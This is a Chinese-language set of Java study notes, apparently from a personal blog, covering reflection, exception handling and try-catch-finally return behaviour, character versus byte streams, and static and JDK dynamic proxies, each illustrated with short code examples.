<h3 id="反射的应用场景"><a href="#反射的应用场景" class="headerlink" title="反射的应用场景"></a>反射的应用场景</h3><p>平时的项目开发过程中，基本上很少会直接使用到反射机制，但这不能说明反射机制没有用，实际上有很多设计、开发都与反射机制有关，例如模块化的开发，通过反射去调用对应的字节码；动态代理设计模式也采用了反射机制，还有日常使用的 Spring／Hibernate 等框架也大量使用到了反射机制。</p>
<p>举例：</p>
<ul>
<li><p>我们在使用 JDBC 连接数据库时使用 Class.forName()通过反射加载数据库的驱动程序；</p>
</li>
<li><p>Spring 框架的 IOC（动态加载管理 Bean）创建对象以及 AOP（动态代理）功能都和反射有联系；</p>
</li>
<li><p>动态配置实例的属性。</p>
</li>
</ul>
<h3 id="获取class对象的4种方式"><a href="#获取class对象的4种方式" class="headerlink" title="获取class对象的4种方式"></a>获取class对象的4种方式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过此方法获取Class对象不会进行初始化</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">string</span> <span class="operator">=</span> String.class;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Class.forName(className)方法，内部实际调用的是一个native方法 forName0(className， true， ClassLoader.getClassLoader(caller)， caller);</span></span><br><span class="line"><span class="comment">//第2个boolean参数表示类是否需要初始化，Class.forName(className)默认是需要初始化。</span></span><br><span class="line"><span class="comment">//一旦初始化，就会触发目标对象的 static块代码执行，static参数也会被再次初始化。</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">alunbarClass1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;cn.javaguide.TargetObject&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过对象获取</span></span><br><span class="line"><span class="type">Employee</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">alunbarClass2</span> <span class="operator">=</span> e.getClass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这种方式加载的不会初始化</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">Class&lt;?&gt; aClass1 = systemClassLoader.loadClass(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本内置类型的包装类都有一个Type属性</span></span><br><span class="line">Class&lt;Integer&gt; type = Integer.TYPE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得父类的class</span></span><br><span class="line">a.getSuperClass()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848033.png" alt="img"></p>
<p>在 Java 中，所有的异常都有一个共同的祖先 java.lang 包中的 Throwable 类。Throwable 类有两个重要的子类 Exception（异常）和 Error（错误）。Exception 能被程序本身处理（try-catch）， Error 是无法处理的（只能尽量避免）。</p>
<ul>
<li>Exception：程序本身可以处理的异常，可以通过 catch 来进行捕获。Exception 又可以分为受检查异常（必须处理，不然编译会报错） 和不受检查异常（可以不处理）。</li>
<li>Error：Error 属于程序无法处理的错误 ，没办法通过 catch 来进行捕获 。例如，Java 虚拟机运行错误（Virtual MachineError）、虚拟机内存不够错误（OutOfMemoryError）、类定义错误（NoClassDefFoundError）等 。这些异常发生时，Java 虚拟机（JVM）一般会选择线程终止。</li>
</ul>
<h4 id="受检异常"><a href="#受检异常" class="headerlink" title="受检异常"></a><strong>受检异常</strong></h4><p>除了RuntimeException及其子类以外，其他的Exception类及其子类都属于受检查异常 。常见的受检查异常有： IO 相关的异常、ClassNotFoundException 、SQLException…。</p>
<h4 id="不受检异常"><a href="#不受检异常" class="headerlink" title="不受检异常"></a><strong>不受检异常</strong></h4><p>Java代码在编译过程中，即使不处理不受检查异常也可以正常通过编译。</p>
<p>RuntimeException 及其子类都统称为非受检查异常，例如：NullPointerException、NumberFormatException（字符串转换为数字）、ArrayIndexOutOfBoundsException（数组越界）、ClassCastException（类型转换错误）、ArithmeticException（算术错误）等。</p>
<h4 id="Throwable类常用方法"><a href="#Throwable类常用方法" class="headerlink" title="Throwable类常用方法"></a>Throwable类常用方法</h4><ul>
<li>public string getMessage()：返回异常发生时的简要描述；</li>
<li>public string toString()：返回异常发生时的详细信息；</li>
<li>public string getLocalizedMessage()：返回异常对象的本地化信息。使用 Throwable 的子类覆盖这个方法，可以生成本地化信息。如果子类没有覆盖该方法，则该方法返回的信息与 getMessage（）返回的结果相同；</li>
<li>public void printStackTrace()：在控制台上打印 Throwable 对象封装的异常信息。</li>
</ul>
<h4 id="try-catch-finally"><a href="#try-catch-finally" class="headerlink" title="try-catch-finally"></a>try-catch-finally</h4><ul>
<li>try块： 用于捕获异常。其后可接零个或多个 catch 块，如果没有 catch 块，则必须跟一个 finally 块。</li>
<li>catch块： 用于处理 try 捕获到的异常。</li>
<li>finally 块： 无论是否捕获或处理异常，finally 块里的语句都会被执行。当在 try 块或 catch块中遇到 return 语句时，finally 语句块将在方法返回之前被执行。</li>
</ul>
<p>在以下 3 种特殊情况下，finally块不会被执行：</p>
<ol>
<li>在 try 或 finally块中用了 System.exit(int)退出程序。但是，如果 System.exit(int) 在异常语句之后，finally 还是会被执行。</li>
<li>程序所在的线程死亡。</li>
<li>关闭 CPU。</li>
</ol>
<p><strong>注意：</strong> 当 try 语句和 finally 语句中都有 return 语句时，在方法返回之前，finally 语句的内容将被执行，并且 finally 语句的返回值将会覆盖原始的返回值。如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> value * value;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果调用 f(2)，返回值将是 0，finally 语句的返回值覆盖了 try 语句块的返回值。</p>
<h4 id="使用try-with-resources来代替try-catch-finally"><a href="#使用try-with-resources来代替try-catch-finally" class="headerlink" title="使用try-with-resources来代替try-catch-finally"></a>使用try-with-resources来代替try-catch-finally</h4><ul>
<li><p>适用范围（资源的定义）： 任何实现 java.lang.AutoCloseable或者 java.io.Closeable 的对象</p>
</li>
<li><p>关闭资源和 final 的执行顺序： 在 try-with-resources 语句中，任何 catch 或 finally 块在声明的资源关闭后运行</p>
</li>
</ul>
<p>《Effecitve Java》中明确指出：</p>
<blockquote>
<p>面对必须要关闭的资源，我们总是应该优先使用 try-with-resources 而不是try-finally。随之产生的代码更简短，更清晰，产生的异常对我们也更有用。try-with-resources语句让我们更容易编写必须要关闭的资源的代码，若采用try-finally则几乎做不到这点。</p>
</blockquote>
<p>当然多个资源需要关闭的时候，使用 try-with-resources 实现起来也非常简单，通过使用分号分隔，可以在try-with-resources块中声明多个资源。</p>
<h4 id="JVM-是如何处理异常的？"><a href="#JVM-是如何处理异常的？" class="headerlink" title="JVM 是如何处理异常的？"></a>JVM 是如何处理异常的？</h4><p>在一个方法中如果发生异常，这个方法会创建一个异常对象，并转交给 JVM， 该异常对象包含异常名称，异常描述以及异常发生时应用程序的状态。创建异常对象并转交给 JVM 的过程称为抛出异常。可能有一系列的方法调用，终才进入抛出异常的方法，这一系列方法调用的有序列表叫做调用栈。</p>
<p>JVM 会顺着调用栈去查找看是否有可以处理异常的代码，如果有，则调用异常处理代码。当 JVM 发现可以处理异常的代码时，会把发生的异常传递给它。如果 JVM 没有找到可以处理该异常的代码块，JVM 就会将该异常转交给默认的异常处理器（默认处理器为 JVM 的一部分），默认异常处理器打印出异常信息并终止应用程序。 </p>
<h4 id="throw-和-throws"><a href="#throw-和-throws" class="headerlink" title="throw 和 throws"></a>throw 和 throws</h4><ul>
<li>throw 关键字用在方法内部，只能用于抛出一种异常，用来抛出方法或代码块中的异常，受查异常和非受查异常都可以被抛出。 </li>
<li>throws 关键字用在方法声明上，可以抛出多个异常，用来标识该方法可能抛出的异常列表。一个方法用 throws 标识了可能抛出的异常列表，调用该方法的方法中必须包含可处理异常的代码，否则也要在方法签名中用 throws 关键字声明相应的异常。</li>
</ul>
<h4 id="final、finally、finalize-有什么区别？"><a href="#final、finally、finalize-有什么区别？" class="headerlink" title="final、finally、finalize 有什么区别？"></a>final、finally、finalize 有什么区别？</h4><ul>
<li>final可以修饰类、变量、方法，修饰类表示该类不能被继承、修饰方法表示该方法不能被重写、修饰变量表示该变量是一个常量不能被重新赋值。 </li>
<li>finally一般作用在try-catch代码块中，在处理异常的时候，通常我们将一定要执行的代码方法finally代码块中，表示不管是否出现异常，该代码块都会执行，一般用 来存放一些关闭资源的代码。 </li>
<li>finalize是一个方法，属于Object类的一个方法，而Object类是所有类的父类， Java 中允许使用 finalize()方法在垃圾收集器将对象从内存中清除出去之前做必要的清理工作。 可以手动调用，但是在对象被销毁时，还是会被调用。</li>
</ul>
<h4 id="NoClassDefFoundError-和-ClassNotFoundException"><a href="#NoClassDefFoundError-和-ClassNotFoundException" class="headerlink" title="NoClassDefFoundError 和  ClassNotFoundException"></a>NoClassDefFoundError 和  ClassNotFoundException</h4><ul>
<li>NoClassDefFoundError 是一个 Error 类型的异常，是由 JVM 引起的，不应该尝试捕获这个异常。 引起该异常的原因是 JVM 或 ClassLoader 尝试加载某类时在内存中找不到该类的定义，该动作发生在运行期间，即编译时该类存在，但是在运行时却找不到 了，可能是变异后被删除了等原因；</li>
<li>ClassNotFoundException是一个受查异常，需要显式地使用 try-catch 对其进行捕获和处理，或在方法签名中用 throws 关键字进行声明。当使用  Class.forName， ClassLoader.loadClass 或 ClassLoader.findSystemClass 动态加载类到内存的时候，通过传入的类路径参数没有找到该类，就会抛出该异常；另一种抛出该异常的可能原因是某个类已经由一个类加载器加载至内存中，另一个加载器又尝试去加载它。</li>
</ul>
<h4 id="try-catch-finally-1"><a href="#try-catch-finally-1" class="headerlink" title="try-catch-finally"></a>try-catch-finally</h4><p>try只适合处理运行时异常，try+catch适合处理运行时异常+普通异常。如果你只用try去处理普通异常却不加以catch处理，编译是通不过的，因为编译器硬性规定，普通异常如果选择捕获，则必须用 catch显示声明以便进一步处理。而运行时异常在编译时没有如此规定，所以 catch可以省略，你加上catch编译器也觉得无可厚非。 </p>
<p>理论上，编译器看任何代码都不顺眼，都觉得可能有潜在的问题，所以你即使对所有代码加上try，代码在运行期时也只不过是在正常运行的基础上加一层皮。 但是你一旦对一段代码加上try，就等于显示地承诺编译器，对这段代码可能抛出的异常进行捕获而非向上抛出处理。如果是普通异常，编译器要求必须用 catch捕获以便进一步处理；如果运行时异常，捕获然后丢弃并且+finally扫尾处理，或者加上catch捕获以便进一步处理。 </p>
<p>至于加上finally，则是在不管有没捕获异常，都要进行的“扫尾”处理。  </p>
<h4 id="try-catch-finally-中，如果-catch-中-return-了，-finally-还会执行吗？"><a href="#try-catch-finally-中，如果-catch-中-return-了，-finally-还会执行吗？" class="headerlink" title="try-catch-finally 中，如果 catch 中 return 了， finally 还会执行吗？"></a>try-catch-finally 中，如果 catch 中 return 了， finally 还会执行吗？</h4><p>会执行，在 return 前执行。 </p>
<p><strong>注意：</strong>在 finally 中改变返回值的做法是不好的，因为如果存在 finally 代码块， try中的 return 语句不会立马返回调用者，而是记录下返回值待 finally 代码块执行完毕之后再向调用者返回其值，然后如果在 finally 中修改了返回值，就会返回修改后的值。显然，在 finally 中返回或者修改返回值会对程序造成很大的困扰，C#中直接用编译错误的方式来阻止，Java 中也可以通过提升编译器的语法检查级别来产生警告或错误。 </p>
<p><strong>示例：</strong> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// 2</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getInt</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 30</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getInt1</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          System.out.println(a / <span class="number">0</span>);</span><br><span class="line">          a = <span class="number">20</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (ArithmeticException e) &#123;</span><br><span class="line">          a = <span class="number">30</span>;</span><br><span class="line">          <span class="keyword">return</span> a;</span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">           * return a 在程序执行到这一步的时候，这里不是return a 而是 return 30；这个返回路径就形成了</span></span><br><span class="line"><span class="comment">           * 但是呢，它发现后面还有finally，所以继续执行finally的内容，a=40</span></span><br><span class="line"><span class="comment">           * 再次回到以前的路径，继续走return 30，形成返回路径之后，这里的a就不是a变量了，而是常量30</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          a = <span class="number">40</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> a;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 40</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getInt2</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          System.out.println(a / <span class="number">0</span>);</span><br><span class="line">          a = <span class="number">20</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (ArithmeticException e) &#123;</span><br><span class="line">          a = <span class="number">30</span>;</span><br><span class="line">          <span class="keyword">return</span> a;</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          a = <span class="number">40</span>;</span><br><span class="line">          <span class="keyword">return</span> a;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="类-ExampleA-继承-Exception，类-ExampleB-继承-ExampleA。"><a href="#类-ExampleA-继承-Exception，类-ExampleB-继承-ExampleA。" class="headerlink" title="类 ExampleA 继承 Exception，类 ExampleB 继承 ExampleA。"></a>类 ExampleA 继承 Exception，类 ExampleB 继承 ExampleA。</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123; </span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExampleB</span>(<span class="string">&quot;b&quot;</span>) </span><br><span class="line"> &#125; <span class="keyword">catch</span>（ExampleA e）&#123; </span><br><span class="line">  System.out.println(<span class="string">&quot;ExampleA&quot;</span>); </span><br><span class="line"> &#125; <span class="keyword">catch</span>（Exception e）&#123; </span><br><span class="line">  System.out.println(<span class="string">&quot;Exception&quot;</span>); </span><br><span class="line"> &#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// ExampleA</span></span><br><span class="line"><span class="comment">// 根据里氏代换原则[能使用父类型的地方一定能使用子类型]，抓取 ExampleA 类型异常的 catch块能够抓住 try 块中抛出的 ExampleB  类型的异常</span></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Human</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Sneeze</span>();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Annoyance e) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Caught Annoyance&quot;</span>);</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Sneeze sneeze) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Caught Sneeze&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Annoyance</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sneeze</span> <span class="keyword">extends</span> <span class="title class_">Annoyance</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> <strong>结果:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Caught Annoyance </span><br><span class="line">Caught Sneeze </span><br><span class="line">Hello World! </span><br></pre></td></tr></table></figure>

<h4 id="Java常见异常"><a href="#Java常见异常" class="headerlink" title="Java常见异常"></a>Java常见异常</h4><p>java.lang.IllegalAccessError：违法访问错误。当一个应用试图访问、修改某个类的域（Field）或者调用其方法，但是又违反域或方法的可见性声明，则抛出该异常。</p>
<p>java.lang.InstantiationError：实例化错误。当一个应用试图通过Java的new操作符构造一个抽象类或者接口时抛出该异常.</p>
<p>java.lang.OutOfMemoryError：内存不足错误。当可用内存不足以让Java虚拟机分配给一个对象时抛出该错误。</p>
<p>java.lang.StackOverflowError：堆栈溢出错误。当一个应用递归调用的层次太深而导致堆栈溢出或者陷入死循环时抛出该错误。</p>
<p>java.lang.ClassCastException：类造型异常。假设有类A和B（A不是B的父类或子类），O是A的实例，那么当强制将O构造为类B的实例时抛出该异常。该异常经常被称为强制类型转换异常。</p>
<p>java.lang.ClassNotFoundException：找不到类异常。当应用试图根据字符串形式的类名构造类，而在遍历CLASSPAH之后找不到对应名称的class文件时，抛出该异常。 java.lang.ArithmeticException：算术条件异常。譬如：整数除零等。</p>
<p>java.lang.ArrayIndexOutOfBoundsException：数组索引越界异常。当对数组的索引值为负数或大于等于数组大小时抛出。</p>
<p>java.lang.IndexOutOfBoundsException：索引越界异常。当访问某个序列的索引值小于0或大于等于序列大小时，抛出该异常。 java.lang.InstantiationException：实例化异常。当试图通过newInstance()方法创建某个类的实例，而该类是一个抽象类或接口时，抛出该异常。</p>
<p>java.lang.NoSuchFieldException：属性不存在异常。当访问某个类的不存在的属性时抛出该异常。</p>
<p>java.lang.NoSuchMethodException：方法不存在异常。当访问某个类的不存在的方法时抛出该异常。</p>
<p>java.lang.NullPointerException：空指针异常。当应用试图在要求使用对象的地方使用了null时，抛出该异常。譬如：调用null对象的实例方法、访问null对象的属性、计算null对象的长度、使用throw语句抛出null等等。</p>
<p>java.lang.NumberFormatException：数字格式异常。当试图将一个String转换为指定的数字类型，而该字符串确不满足数字类型要求的格式时，抛出该异常。</p>
<p>java.lang.StringIndexOutOfBoundsException：字符串索引越界异常。当使用索引值访问某个字符串中的字符，而该索引值小于0或大于等于序列大小时，抛出该异常</p>
<h3 id="既然有了字节流，为什么还要有字符流"><a href="#既然有了字节流，为什么还要有字符流" class="headerlink" title="既然有了字节流，为什么还要有字符流?"></a>既然有了字节流，为什么还要有字符流?</h3><p>Java中一切都是字节流，没有字符流，字符只是根据编码对字节流进行翻译的结果。字符流是由 Java 虚拟机将字节转换得到的，问题就出在这个过程还算是非常耗时，并且，如果我们不知道编码类型就很容易出现乱码问题。所以， I&#x2F;O 流就干脆提供了一个直接操作字符的接口，方便我们平时对字符进行流操作。如果音频文件、图片等媒体文件用字节流比较好，如果涉及到字符的话使用字符流比较好。</p>
<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>静态代理中，对目标对象的每个方法的增强都是手动完成的，非常不灵活（比如接口一旦新增加方法，目标对象和代理对象都要进行修改）且麻烦（需要对每个目标类都单独写一个代理类）。 实际应用场景非常非常少，日常开发几乎看不到使用静态代理的场景。</p>
<p>上面是从实现和应用角度来说的静态代理，从 JVM 层面来说， 静态代理在编译时就将接口、实现类、代理类这些都变成了一个个实际的 class 文件。</p>
<p><strong>1.定义发送短信的接口</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    String <span class="title function_">send</span><span class="params">(String message)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2.实现发送短信的接口</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;send message:&quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.创建代理类并同样实现发送短信的接口</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsProxy</span> <span class="keyword">implements</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SmsService smsService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SmsProxy</span><span class="params">(SmsService smsService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.smsService = smsService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="comment">//调用方法之前，我们可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before method send()&quot;</span>);</span><br><span class="line">        smsService.send(message);</span><br><span class="line">        <span class="comment">//调用方法之后，我们同样可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;after method send()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>4.实际使用</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SmsService</span> <span class="variable">smsService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SmsServiceImpl</span>();</span><br><span class="line">        <span class="type">SmsProxy</span> <span class="variable">smsProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SmsProxy</span>(smsService);</span><br><span class="line">        smsProxy.send(<span class="string">&quot;java&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行上述代码之后，控制台打印出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">before method send()</span><br><span class="line">send message:java</span><br><span class="line">after method send()</span><br></pre></td></tr></table></figure>

<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>相比于静态代理来说，动态代理更加灵活。不需要针对每个目标类都单独创建一个代理类，并且也不需要必须实现接口，可以直接代理实现类（CGLIB 动态代理机制）。</p>
<p><strong>从 JVM 角度来说，动态代理是在运行时动态生成类字节码，并加载到 JVM 中的。</strong></p>
<p>Spring AOP、RPC 框架实现都依赖了动态代理。</p>
<p><strong>动态代理在日常开发中使用的相对较小，但是在框架中的几乎是必用的一门技术。</strong></p>
<p>就 Java 来说，动态代理的实现方式有<strong>JDK 动态代理</strong>、<strong>CGLIB 动态代理</strong>等。</p>
<h3 id="JDK动态代理机制"><a href="#JDK动态代理机制" class="headerlink" title="JDK动态代理机制"></a>JDK动态代理机制</h3><ol>
<li>定义一个接口及其实现类；</li>
<li>自定义 InvocationHandler 并重写invoke方法，在 invoke 方法中会调用原生方法（被代理类的方法）并自定义一些处理逻辑；</li>
<li>通过 Proxy.newProxyInstance(ClassLoader loader，Class&lt;?&gt;[] interfaces，InvocationHandler h) 方法创建代理对象；</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义发送短信的接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    String <span class="title function_">send</span><span class="params">(String message)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 实现发送短信的接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;send message:&quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义一个JDK动态代理类</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DebugInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代理类中的真实对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DebugInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//invoke() 方法: 当我们的动态代理对象调用原生方法的时候，最终实际上调用到的是 invoke() 方法，然后 invoke() 方法代替我们去调用了被代理对象的原生方法。</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy， Method method， Object[] args)</span> <span class="keyword">throws</span> InvocationTargetException， IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//调用方法之前，我们可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before method &quot;</span> + method.getName());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target， args);</span><br><span class="line">        <span class="comment">//调用方法之后，我们同样可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;after method &quot;</span> + method.getName());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取代理对象的工厂类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdkProxyFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProxy</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">                target.getClass().getClassLoader()， <span class="comment">// 目标类的类加载</span></span><br><span class="line">                target.getClass().getInterfaces()，  <span class="comment">// 代理需要实现的接口，可指定多个</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">DebugInvocationHandler</span>(target)   <span class="comment">// 代理对象对应的自定义 InvocationHandler</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际使用</span></span><br><span class="line"><span class="type">SmsService</span> <span class="variable">smsService</span> <span class="operator">=</span> (SmsService) JdkProxyFactory.getProxy(<span class="keyword">new</span> <span class="title class_">SmsServiceImpl</span>());</span><br><span class="line">smsService.send(<span class="string">&quot;java&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

